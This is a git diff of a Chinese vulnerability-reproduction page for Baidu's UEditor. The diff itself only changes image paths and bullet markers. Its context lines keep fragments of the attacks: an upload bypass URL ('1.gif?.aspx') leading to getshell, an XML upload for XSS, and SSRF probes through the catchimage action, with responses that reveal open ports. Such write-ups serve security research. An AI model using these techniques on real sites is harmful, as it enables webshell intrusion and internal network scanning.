@@ -6,7 +6,7 @@ UEditor 是由百度「FEX前端研发团队」开发的所见即所得富文本
 
 界面如下：
 
-![ueditor-1](images/ueditor-1.webp)
+![ueditor-1](../.gitbook/assets/ueditor-1.webp)
 
 ## 漏洞复现
 
@@ -40,19 +40,17 @@ http://www.xxxx.com/ueditor/net/controller.ashx?action=listimage
 </form>
 ```
 
-![ueditor-2](images/ueditor-2.webp)
+![ueditor-2](../.gitbook/assets/ueditor-2.webp)
 
-- `shell addr` 处填写服务器上图片码地址，构造成以下格式，绕过上传使其解析为 `aspx`
+* `shell addr` 处填写服务器上图片码地址，构造成以下格式，绕过上传使其解析为 `aspx`
 
 ```
 http://xxxx/1.gif?.aspx
 ```
 
-- 成功上传返回上传路径，可直连 getshell
+* 成功上传返回上传路径，可直连 getshell
 
-![ueditor-3](images/ueditor-3.webp)
-
-
+![ueditor-3](../.gitbook/assets/ueditor-3.webp)
 
 ### 0x03 php版本文件上传
 
@@ -119,11 +117,11 @@ http://localhost/ueditor/php/upload/fuck.php
 
 将`uploadimage`类型改为`uploadfile`，修改文件后缀名为`.xml`：
 
-![ueditor-4](images/ueditor-4.webp)
+![ueditor-4](../.gitbook/assets/ueditor-4.webp)
 
 上传成功，访问成功弹框：
 
-![ueditor-5](images/ueditor-5.webp)
+![ueditor-5](../.gitbook/assets/ueditor-5.webp)
 
 #### 一些常见的xml弹窗poc
 
@@ -173,19 +171,19 @@ http://xxx/cmd/ueditor/jsp/controller.jsp?action=catchimage&source[]=https://www
 
 判断该地址对应的主机端口是否开放：
 
-- 如果抓取不存在的图片地址时，页面返回如下，即state为"远程连接出错"。
+* 如果抓取不存在的图片地址时，页面返回如下，即state为"远程连接出错"。
 
 ```
 {"state": "SUCCESS", list:[{"state":"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}
 ```
 
-- 如果成功抓取到图片，页面返回如下，即state为"SUCCESS"。
+* 如果成功抓取到图片，页面返回如下，即state为"SUCCESS"。
 
 ```
 {"state": "SUCCESS", list: [{"state":"SUCCESS","size":"5103","source":"http://192.168.135.133:8080/tomcat.png","title":"1527173588127099881.png","url":"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"}]}
 ```
 
-- 如果主机无法访问，页面返回如下，即state为"抓取远程图片失败"。
+* 如果主机无法访问，页面返回如下，即state为"抓取远程图片失败"。
 
 ```
 {"state":"SUCCESS", list: [{"state":"\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25"}]}
@@ -206,4 +204,3 @@ Connection: keep-alive
 
 upfile=https://www.google.com/?%23.jpg
 ```
-
